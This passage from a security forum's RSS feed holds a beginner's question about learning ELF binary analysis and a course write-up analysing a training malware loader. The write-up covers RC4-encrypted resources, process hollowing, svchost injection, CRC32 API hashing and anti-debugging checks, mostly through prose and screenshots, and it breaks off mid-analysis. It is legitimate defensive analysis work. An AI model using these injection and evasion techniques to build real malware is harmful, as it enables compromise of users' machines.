            <p><a href="https://d.clarkee.co.uk/t/utilizing-discord-as-a-possible-attack-vector/22609">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/utilizing-discord-as-a-possible-attack-vector/22609</link>
          <pubDate>Thu, 06 Aug 2020 20:47:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22609</guid>
          <source url="https://d.clarkee.co.uk/t/utilizing-discord-as-a-possible-attack-vector/22609.rss">Utilizing Discord as a Possible Attack Vector</source>
        </item>
        <item>
          <title>ELF binaries are intimidating, Any tips?</title>
          <dc:creator><![CDATA[digitalXmage]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>So, I consider myself a confident C programmer. So pointers, don’t scare me, I know the basics of computer architecture and theory, binary,registers,memory  etc. etc. However I’ve always been interested in how a virus works. And just low level programming in general. I’ve been going through a book ‘<strong>Learning Linux Binary Analysis</strong>’. And it’s really interesting. There’s a lot of information to absorb, especially chapter 2. However i feel like I’m understanding everything so far. And realizing how executable files are an amazing feat in engineering, and It’s igniting my passion to learn more.</p>
<p>However Going through the book I realize I have a long way to go, like long way… It’s quite intimidating. Like i need to brush up on hexadecimal, as it’s everywhere. I know it’s important to do projects, the only thing I’ve created is a basic ELF parser, and looking into injection based patching, which the theory seems straight forward enough…</p>
<p><em>I have a few questions:</em></p>
<p>1.what was your humble beginnings like getting into learning about ELF binaries?</p>
<p>2.How did you go about learning and absorbing all the information?</p>
<p>3.How long did it take you to feel confident and competent with knowing ur way around binaries and messing around with binaries?</p>
<ol start="4">
<li>Any other advice?</li>
</ol>
            <p><small>6 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/elf-binaries-are-intimidating-any-tips/22478">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/elf-binaries-are-intimidating-any-tips/22478</link>
          <pubDate>Wed, 29 Jul 2020 16:46:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22478</guid>
          <source url="https://d.clarkee.co.uk/t/elf-binaries-are-intimidating-any-tips/22478.rss">ELF binaries are intimidating, Any tips?</source>
        </item>
        <item>
          <title>Zero2Auto - CruLoader</title>
          <dc:creator><![CDATA[Danus]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1>Zero2Auto - CruLoader</h1>
<h2>Preface</h2>
<p>As part of the course we were instructed to analyze a custom malware sample developed for us, below is a full analysis of that sample plus a an automated script to extract the final payload of that sample.</p>
<hr>
<p>Hi there,</p>
<p>During an ongoing investigation, one of our IR team members managed to locate an unknown sample on an infected machine belonging to one of our clients. We cannot pass that sample onto you currently as we are still analyzing it to determine what data was exfilatrated. However, one of our backend analysts developed a YARA rule based on the malware packer, and we were able to locate a similar binary that seemed to be an earlier version of the sample we’re dealing with. Would you be able to take a look at it? We’re all hands on deck here, dealing with this situation, and so we are unable to take a look at it ourselves.<br>
We’re not too sure how much the binary has changed, though developing some automation tools might be a good idea, in case the threat actors behind it start utilizing something like Cutwail to push their samples.<br>
I have uploaded the sample alongside this email.</p>
<p>Thanks, and Good Luck!</p>
<hr>
<h2>Basic Static &amp; Dynamic Anaylsis</h2>
<h3>Sample information:</h3>
<p>SHA-256: <strong>[Redacted]</strong></p>
<p>Intezer: <strong>[Redacted]</strong></p>
<p>Any.run:<br>
<strong>[Redacted]</strong></p>
<p>VirusTotal:<br>
<strong>[Redacted]</strong></p>
<p>We begin by running the sample in a sandboxed environment like any.run. We can immediately see that this process launches itself and <strong>svchost</strong> as a sub process. This can also be confirmed within Intezer, and in Intezer one can examine the strings contained within each sub process. We can assume there is process injection happening.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/b/b1a8cdf8d0fc23d4e49e45a57570128aa04761f5.png" data-download-href="/uploads/short-url/plEaOqHnm5EWokcvloDHXLfTEIl.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b1a8cdf8d0fc23d4e49e45a57570128aa04761f5_2_624x275.png" alt="" data-base62-sha1="plEaOqHnm5EWokcvloDHXLfTEIl" width="624" height="275" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b1a8cdf8d0fc23d4e49e45a57570128aa04761f5_2_624x275.png, https://0x00sec.s3.amazonaws.com/original/2X/b/b1a8cdf8d0fc23d4e49e45a57570128aa04761f5.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/b/b1a8cdf8d0fc23d4e49e45a57570128aa04761f5.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b1a8cdf8d0fc23d4e49e45a57570128aa04761f5_2_10x10.png"></a></div><p></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2ee00225c612a4379738873b451952704d24068f.png" alt="" data-base62-sha1="6GFTLiiqyQSaDRLcLeTlaxwOmsv" width="499" height="277"></p>
<p>Regarding any connection made to outer servers, we can see that <strong><a href="http://pastebin.com" rel="noopener nofollow ugc">pastebin.com</a></strong> is being contacted.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e884dc4d7798ff6f2d13222759e36be62784d9ea.png" alt="" data-base62-sha1="xaXqnUpfpmd5l2tXPaaxMsWwOqS" width="470" height="187"></p>
<p>There is a suspicious looking resource within the resource section:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/46b5e4467690252f63a0abba2f5b8706205d5f01.png" data-download-href="/uploads/short-url/a5x7H2VLDPXHM1u3Ey8JN58V7t7.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/46b5e4467690252f63a0abba2f5b8706205d5f01.png" alt="" data-base62-sha1="a5x7H2VLDPXHM1u3Ey8JN58V7t7" width="624" height="47" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/46b5e4467690252f63a0abba2f5b8706205d5f01_2_10x10.png"></a></div><p></p>
<p>Before the sandbox quit on <strong>Any.run</strong> – one can see a strange looking <strong>MessageBox</strong> string.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9b82fd7fe8fbd681647d921b3daf78784480deda.png" alt="" data-base62-sha1="mbIEuTJ8RkO3Z6IVJ2jvuzPWS8i" width="500" height="187"></p>
<p>Finally, the strings found in all first 3 loaded process appear to encrypt, and this can be easily confirmed within Intezer:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/881cfec6655148e529ac1545df4967c9700f10cf.png" alt="" data-base62-sha1="jq73AJfTlBgOEZ7SkMLeWXIkr8P" width="239" height="158"><br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/1/1746ab522653854d36bb541912582bf170525ca1.png" data-download-href="/uploads/short-url/3jUoaTpnEaPY1OEOs59lFYeO3ct.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1746ab522653854d36bb541912582bf170525ca1_2_261x160.png" alt="" data-base62-sha1="3jUoaTpnEaPY1OEOs59lFYeO3ct" width="261" height="160" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1746ab522653854d36bb541912582bf170525ca1_2_261x160.png, https://0x00sec.s3.amazonaws.com/optimized/2X/1/1746ab522653854d36bb541912582bf170525ca1_2_391x240.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/1/1746ab522653854d36bb541912582bf170525ca1_2_522x320.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1746ab522653854d36bb541912582bf170525ca1_2_10x10.png"></a></div><p></p>
<p><strong>Summary</strong>:<br>
We’re going to be looking for process injection, I suspect that the resource located within the resource section would be mapped into memory, unpacked or decrypted and then injected into the second sub process. There are 4 sub process in total so our final payload would be located on the fourth sub process. It is assumed that the payload would connect to pastebin and display a message box. There is definitely string encryption going on, so we’ll have to deal with that as well.</p>
<hr>
<h2>Static and Dynamic Anaylsis</h2>
<p>This binary is compiled with Visual Studio C++, the implications of that mean that the actual main function is located somewhere within the start function and I’ve located it by recursively traversing xrefs from one of the imported functions. The main function is located at <strong>0x00401400</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bf59ca1c6fd5521883a486db385e01c17d57178c.png" alt="" data-base62-sha1="riLzkWwG3Al8ZHUEbenk16JYyvi" width="233" height="350"></p>
<p>When viewing the code of the main function one can see gibberish strings being pushed before function calls:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/9c7079266ff70c5b09ae6ade353d1017b8a1867f.png" data-download-href="/uploads/short-url/mjVspkcrSzYl17u1LDQlSmoeXdt.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9c7079266ff70c5b09ae6ade353d1017b8a1867f.png" alt="" data-base62-sha1="mjVspkcrSzYl17u1LDQlSmoeXdt" width="269" height="272" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9c7079266ff70c5b09ae6ade353d1017b8a1867f_2_10x10.png"></a></div><p></p>
<p>The function that is called after each push is the same, I instantly assume there is some string encryption going on. The extensive use of <strong>LoadLibraryA</strong> and <strong>GetProcAddress</strong> also makes me assume these strings are API strings that are resolved using <strong>LoadLibraryA</strong> and <strong>GetProcAddress</strong>.</p>
<p>At <strong>loc_401550</strong> and <strong>loc_401570</strong> one can located something that resembles a <strong>RC4 KSA</strong> routine, it is easily recognized by the two loop procedures iterating <strong>256</strong> times.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/8/853075b5aa7a9b1e4d54b3972c690dfc07bc54d4.png" data-download-href="/uploads/short-url/j0fklFRvCBX94DqcR9dHWbojlRy.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/853075b5aa7a9b1e4d54b3972c690dfc07bc54d4.png" alt="" data-base62-sha1="j0fklFRvCBX94DqcR9dHWbojlRy" width="285" height="456" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/853075b5aa7a9b1e4d54b3972c690dfc07bc54d4_2_10x10.png"></a></div><p></p>
<p>These are just quick assumptions I’ve made by looking at the binary, the rest of it is filled with obfuscated code and otherwise an extensive use of registers and dynamic resolving so we’ll have to resort to dynamic analysis. I’ve disabled <strong>ASLR</strong> for this binary with <strong>CFF explorer</strong> so it would be easier to debug it.<br>
I’ve set relevant breakpoints within the debugger. So all the resource related functions to locate any resource loading, <strong>CreateProcessInternalW</strong> for process initialization and <strong>VirtualProtect</strong>, <strong>VirtualAllocEx</strong> and <strong>WriteProcessMemory</strong> for injection. In addition I’ve set breakpoints on <strong>OutputDebugString</strong> and <strong>IsDebuggerPresent</strong> to catch easy implemented anti analysis.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/7/767537c7581d0edf4d0d8da70bb70235be510606.png" data-download-href="/uploads/short-url/gTVtJRQEJmxcowxQPY79BEP5058.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/767537c7581d0edf4d0d8da70bb70235be510606.png" alt="" data-base62-sha1="gTVtJRQEJmxcowxQPY79BEP5058" width="624" height="99" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/767537c7581d0edf4d0d8da70bb70235be510606_2_10x10.png"></a></div><p></p>
<p>First, as assumed the <strong>sub_401300</strong> seems to be resolving strings:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/6/693d6e043fc54eac36e0cd4580fde78ddce189fa.png" data-download-href="/uploads/short-url/f0ZKjBfmBDNrtic2hhnb8SOLyoW.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/693d6e043fc54eac36e0cd4580fde78ddce189fa.png" alt="" data-base62-sha1="f0ZKjBfmBDNrtic2hhnb8SOLyoW" width="624" height="280" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/693d6e043fc54eac36e0cd4580fde78ddce189fa_2_10x10.png"></a></div><p></p>
<p>The function <strong>func_StringDecrypt</strong> seems to be decrypting strings using some kind of custom base64 decoding, The reason I suspect is – is because the use of the full alphanumeric string that is being passed within this function. This function would be studied extensively later on in this paper and we’ll attempt to generate an automation script for it to decode all strings within this sample.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/7/7f6811edd2499307bbe52df9c7868338c9baa2d1.png" data-download-href="/uploads/short-url/ib5BGgm9JsZmpCO6zfMJ4WFwN0Z.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7f6811edd2499307bbe52df9c7868338c9baa2d1.png" alt="" data-base62-sha1="ib5BGgm9JsZmpCO6zfMJ4WFwN0Z" width="624" height="123" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7f6811edd2499307bbe52df9c7868338c9baa2d1_2_10x10.png"></a></div><p></p>
<p>Then the sample does something interesting:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c31e5e6d7dd1ca971f92054cbeb56e10d2113f59.png" data-download-href="/uploads/short-url/rQ6aE4Mf1A6mbISISQmm1WjEktj.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c31e5e6d7dd1ca971f92054cbeb56e10d2113f59.png" alt="" data-base62-sha1="rQ6aE4Mf1A6mbISISQmm1WjEktj" width="443" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c31e5e6d7dd1ca971f92054cbeb56e10d2113f59_2_10x10.png"></a></div><p></p>
<p>It allocates space for the resource but it skips the first <strong>0x1C</strong> bytes within the resource.</p>
<p>Hmm, perhaps this is the decryption key for the <strong>RC4</strong> algorithm we saw before?</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2a35c452b6e91b4ffd03c5667d769aab4918a0b3.png" alt="" data-base62-sha1="61pfqk0R7Wx42QkUjrznK1JzTtV" width="590" height="29"></p>
<p>Then a call is performed to <strong>sub_402DB0</strong> which I renamed to <strong>func_CopyResourceWithoutKeyToAllocMem</strong> because that is exactly what it does, it just copies the resource without its key, so starting at offset <strong>0x1C</strong>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/92a3e39710f69028bd173ea52aff8ff104c974a9.png" alt="" data-base62-sha1="kVeQ9XhBDwUhV7F0KS4uUsDekAx" width="505" height="152"></p>
<p>because that is exactly what it does, it just copies the resource without its key, so starting at offset <strong>0x1C</strong>. This function would seem very confusing at first, but if we set a hardware <strong>breakpoint</strong> on the allocated memory we’ll break within this function we can confirm this. Because at 00403002 it performs this copying procedure and then it just exists the function:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/781aac6a248a4a5ebaa6adb991b14a46ed6b1379.png" alt="" data-base62-sha1="h8urxjYWD0UlEiX3CNNDmAryIf7" width="589" height="170"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f3a8514cfe205c9893d71129669104790c9ba4b9.png" alt="" data-base62-sha1="yLuDVOIUeLWxG1Il8QTPHhJ6meZ" width="565" height="222"></p>
<p>Then <strong>sub_4025B0</strong> is executed, it receives a stack address and we simply skip this function while looking at that address on dump we can see that it simply zeroes it out.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d13247593b0070b3c2f6302496bbf96d45a83195.png" alt="" data-base62-sha1="tQDvNN64tdKVjtOPJELwdw7cYq9" width="593" height="167"></p>
<p>So thankfully I’m saving a lot of time by skipping these rabbit holes.</p>
<p>Then the assumed <strong>RC4</strong> algorithm executes, what I want to do is locate the address to where the sample mapped the resource to memory as I suspect that it’s going to be decrypted.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a2dbd1b1b1fefd3726d402ac6b5ce5312d7de0ec.png" alt="" data-base62-sha1="neIjfyUJIuVmSiE7qZCATWil4Re" width="590" height="166"></p>
<p>So I’m going to skip the RC4 decryption routine and jump straight to address 0x40161D</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7e0f3ab485829391fc919532ba18cf7fd6865065.png" alt="" data-base62-sha1="hZaMYwjbPilHKlcKxb6PEMUiBTf" width="594" height="165"></p>
<p>Yay! I decide to dump the new PE file out to disk but we’re not done yet. We have to see how it’s going to be injected to memory.</p>
<p>We jump into <strong>sub_401000</strong>:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a6ffa02b9fb9576138028929398b06a84dcad9ca.png" alt="" data-base62-sha1="nPkW0hvDbKAGaqK6J3FtkA0OLHQ" width="445" height="131"></p>
<p>First the sample resolves the <strong>ImageBase</strong> of the current executing sample and then it attempts to confirm and locate the address of the <strong>NT_Headers</strong> of the decrypted payload.</p>
<p>Then the current process main.bin is created in suspended mode</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f8e373510b66a17b8aafb48d4508c6817bad5823.png" data-download-href="/uploads/short-url/zvLIPj0hjNqywQfsXUU5NtkqvFF.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f8e373510b66a17b8aafb48d4508c6817bad5823.png" alt="" data-base62-sha1="zvLIPj0hjNqywQfsXUU5NtkqvFF" width="624" height="49" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f8e373510b66a17b8aafb48d4508c6817bad5823_2_10x10.png"></a></div><p></p>
<p>Seems like there is going to be process injection involved.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6215474b6ec517ea2760953df980f0e4c5b52c41.png" alt="" data-base62-sha1="dZGnCPmkrgXnzmlyZoJCejsw9C9" width="566" height="160"></p>
<p>First memory is allocated within the new process. The sample attempts to execute <strong>VirtualAllocEx</strong> on the new process. Attempting to allocate memory at the payloads PE default <strong>ImageBase</strong> and with the virtual Size of the image. This won’t work though under our modified execution since we disabled <strong>ASLR</strong>. Why? Because both processes execute at the same <strong>ImageBase</strong>, the new process already has memory allocated within that region, so we must enable <strong>ASLR</strong> and start again. So, lets do that just that and we’ll see that it would work.</p>
<p>Then the sample will copy the payloads section to their correct virtual addresses:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/64927f4f2cf4950112291325481456cb4d9958d0.png" alt="" data-base62-sha1="elHCc9VoPGnQdDVBXYBRWsGk1Gw" width="436" height="453"></p>
<p>Then something very interesting happens:<br>
The <strong>ImageBase</strong> of the payload is written to the <strong>PEB</strong> of the new process, specifically at offset 0x8.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7958c520fcb283055dcb3fc71a4d3d2d03e385d6.png" alt="" data-base62-sha1="hjtXHbeAcVsNLyDbLV2g9hTEhhA" width="179" height="72"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/649618079423af112dc93477514aeaa048333c38.png" alt="" data-base62-sha1="elPjWuIzdZZcczPOGeuy2rqWS5W" width="458" height="235"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a803d4ad6b1b9b9dbc6c3aa538fff1d5cf7fba07.png" alt="" data-base62-sha1="nYkqbNEAYDJ4jY9W5Xa3TTMwj5B" width="514" height="101"></p>
<p>We can assume that the payload would use this to resolve its own APIs.</p>
<p>Finally, <strong>SetThreadContext</strong> and <strong>ResumeThread</strong> are called, and the injected payload executes.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e09c1cdc8e957f9f019cf16c53fc124c385c983c.png" alt="" data-base62-sha1="w2ZqfumdQsV7d7qsJDaaAvJaTEg" width="395" height="91"></p>
<hr>
<h2>Second Payload Analysis</h2>
<h3>Sample information:</h3>
<p>SHA-256: <strong>[Redacted]</strong></p>
<p>Intezer: <strong>[Redacted]</strong></p>
<p>Any.run: <strong>[Redacted]</strong></p>
<p>VirusTotal: <strong>[Redacted]</strong></p>
<h2>Advanced Static and Dynamic Analysis</h2>
<p>I’m going to assume process injection again and go straight into analysis, I’ll disable <strong>ASLR</strong> for this execution as I would be executing the second stage payload independently and so the previous problem, we encountered due disabling <strong>ASLR</strong> shouldn’t bother us.</p>
<p>It is observed that this second stage contains API hashing as the extensive use of <strong>CRC32</strong> constants indicates that:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3531de48d279186cdf225e9dc5fa0a4b35c268f3.png" alt="" data-base62-sha1="7AA9bX7BObB1glpaiNwmyiWIjOb" width="320" height="171"></p>
<p>In addition, the function that was seen in the first stage loader that simply copies the payload into memory from the resource section can be seen:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/07c7e94ca228965d34eff24c0b7d48bc9332be56.png" alt="" data-base62-sha1="16PEjSx0aViZNsO4E6zJ8beK7Yy" width="383" height="406"></p>
<p>I’ve set relevant breakpoints within the debugger. So, all the resource related functions to locate any resource loading, <strong>CreateProcessInternalW</strong> for process initialization and <strong>VirtualProtect</strong>, <strong>VirtualAllocEx</strong> and <strong>WriteProcessMemory</strong> for injection. In addition, I’ve set breakpoints on <strong>OutputDebugString</strong> and <strong>IsDebuggerPresent</strong> to catch easy implemented anti analysis.</p>
<p>The malware takes the name of the file that its currently executing from and hashes it using a <strong>CRC32</strong> hashing algorithm, it can be identified by the <strong>CRC32</strong> hashing constants found within this function. The sample then compares the result against a constant value. I’m assuming its using this method as an anti-analysis method to check if the samples name is “sample” or “malware” its really hard to tell. If this check matches the sample quits execution.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/6/6f21414ae6a7e89fbce0527c6382be4d004e315c.png" data-download-href="/uploads/short-url/fR6fmFNcBzflnOo6P3hIw5klOri.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6f21414ae6a7e89fbce0527c6382be4d004e315c.png" alt="" data-base62-sha1="fR6fmFNcBzflnOo6P3hIw5klOri" width="624" height="73" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6f21414ae6a7e89fbce0527c6382be4d004e315c_2_10x10.png"></a></div><p></p>
<p>Then an API resolving routine called which utilizes the <strong>CRC32</strong> hashing algorithm we seen earlier:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0f8bab987c36bb355f96b775d4c041bc8590be12.png" alt="" data-base62-sha1="2dwp44n2uJOMa72u1SdtELGXKca" width="298" height="79"></p>
<p>The <strong>HashID</strong>(EDX) and the <strong>ID</strong>(ECX) which identifies the library to which to resolve the API from</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/da9b8f4b551e58edcbc7c5e8c414fe55bffccba9.png" alt="" data-base62-sha1="vbTnaM14AOyExtqMSuBs962xvLP" width="459" height="58"><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/106c61c1907591581fef88c71509637e4de41cd9.png" alt="" data-base62-sha1="2lhQuijuBIVoIKuuVvFajWg401X" width="624" height="120"></p>
<p>I will not explain how the API Hashing and resolving in depth. Basically the export table of each loaded DLL is hashed to check which function name matches the hash passed into the function. If anyone wants to read about how that might be implemented they can read about it <a href="https://github.com/DanusMinimus/API-Hash" rel="noopener nofollow ugc">on my github right here</a>.</p>
<p>The sample loads <strong>IsDebuggerPresent</strong> to check if the malware is executing under a debugger, this can be easily circumvented.<br>
The next anti analysis method located within <strong>sub_401000</strong> checks if any blacklisted process is running – the malware hashes each running process and then checks if the hash matches to a pre-computed hash array. If they match the malware quits execution.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/43c50f3d14c789a4df20ec66f50cd01e88e87030.png" alt="" data-base62-sha1="9FwbH0iXnks6wi1jdvGfwlbcV8I" width="378" height="109"></p>
<p>Then the sample executes <strong>sub_401D50</strong> which resolves a lot of APIs that might indicate process injection:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4ebada267efc55fa472385e635de4252e5b19e2e.png" data-download-href="/uploads/short-url/betzr9uAXbtiGr58KWoVguUNOb4.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ebada267efc55fa472385e635de4252e5b19e2e_2_130x291.png" alt="" data-base62-sha1="betzr9uAXbtiGr58KWoVguUNOb4" width="130" height="291" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ebada267efc55fa472385e635de4252e5b19e2e_2_130x291.png, https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ebada267efc55fa472385e635de4252e5b19e2e_2_195x436.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ebada267efc55fa472385e635de4252e5b19e2e_2_260x582.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4ebada267efc55fa472385e635de4252e5b19e2e_2_10x10.png"></a></div><p></p>
<ol>
<li>Start <strong>svchost</strong> with suspended flags</li>
<li>Copy current PE into allocated memory</li>
<li>Allocate Memory in <strong>svchost</strong>
</li>
<li>Rebuild current PE payload relocation table</li>
<li>Write payload into <strong>svchost</strong>
</li>
<li>Use <strong>CreateRemoteThread</strong> to execute function <strong>sub_401DC0</strong>
</li>
</ol>
<p>To continue execution, we simply must attach to a second debugger instance and set a <strong>breakpoint</strong> on the functions location and after running <strong>CreateRemoteThread</strong> we should hit it.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9cde5cbf9d171b0a4591ec7d647e61db7dab023b.png" alt="" data-base62-sha1="mnITs8RtkjXflPZUH2ITXgrDYHF" width="611" height="395"></p>
<p>After setting up the <strong>breakpoint</strong> lets resume execution of the <strong>svchost</strong> instance and then skip <strong>CreateRemoteThread</strong> and see if anything happens. </p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/de459281f3d61ddde4174e96fe317cfec9b80038.png" data-download-href="/uploads/short-url/vIj3uMy2r7zqb6BlRQh8F4GR4CY.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/de459281f3d61ddde4174e96fe317cfec9b80038.png" alt="" data-base62-sha1="vIj3uMy2r7zqb6BlRQh8F4GR4CY" width="624" height="103" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/de459281f3d61ddde4174e96fe317cfec9b80038_2_10x10.png"></a></div><p></p>
<p>Success! We can continue analyzing this function within our documented IDA instance as this function is located in the second stage payload.</p>
<p>It’s important to note that interestingly enough – this function is called previously at <strong>loc_402085</strong> when the <strong>func_CRC32Hash</strong> returns a hashed value for the current executing process name which matches a hardcoded hash.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/a/aa09c32846f1d7e5923b5290b9636fbe6ea59c80.png" data-download-href="/uploads/short-url/oge5jlIezM9rmMYpJnEnbgsc3Ze.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/a/aa09c32846f1d7e5923b5290b9636fbe6ea59c80_2_624x229.png" alt="" data-base62-sha1="oge5jlIezM9rmMYpJnEnbgsc3Ze" width="624" height="229" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/a/aa09c32846f1d7e5923b5290b9636fbe6ea59c80_2_624x229.png, https://0x00sec.s3.amazonaws.com/optimized/2X/a/aa09c32846f1d7e5923b5290b9636fbe6ea59c80_2_936x343.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/a/aa09c32846f1d7e5923b5290b9636fbe6ea59c80.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/a/aa09c32846f1d7e5923b5290b9636fbe6ea59c80_2_10x10.png"></a></div><br>
I quickly assumed that this is a method to detect if the binary is running from <strong>svchost</strong>, because as we seen in the malware’s execution process tree, it executes <strong>svchost</strong> twice. I later confirmed this check by renaming the sample to <strong>svchost.exe</strong> and it worked:<p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/e/e4b3e1f3965b971dbc44b271abaadf17932b3be6.png" data-download-href="/uploads/short-url/wDcg7ssmiAEBTh0v8zBHsyfuhXo.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e4b3e1f3965b971dbc44b271abaadf17932b3be6_2_624x80.png" alt="" data-base62-sha1="wDcg7ssmiAEBTh0v8zBHsyfuhXo" width="624" height="80" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e4b3e1f3965b971dbc44b271abaadf17932b3be6_2_624x80.png, https://0x00sec.s3.amazonaws.com/optimized/2X/e/e4b3e1f3965b971dbc44b271abaadf17932b3be6_2_936x120.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/e/e4b3e1f3965b971dbc44b271abaadf17932b3be6.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e4b3e1f3965b971dbc44b271abaadf17932b3be6_2_10x10.png"></a></div><p></p>
<p>Let’s continue with the analysis.</p>
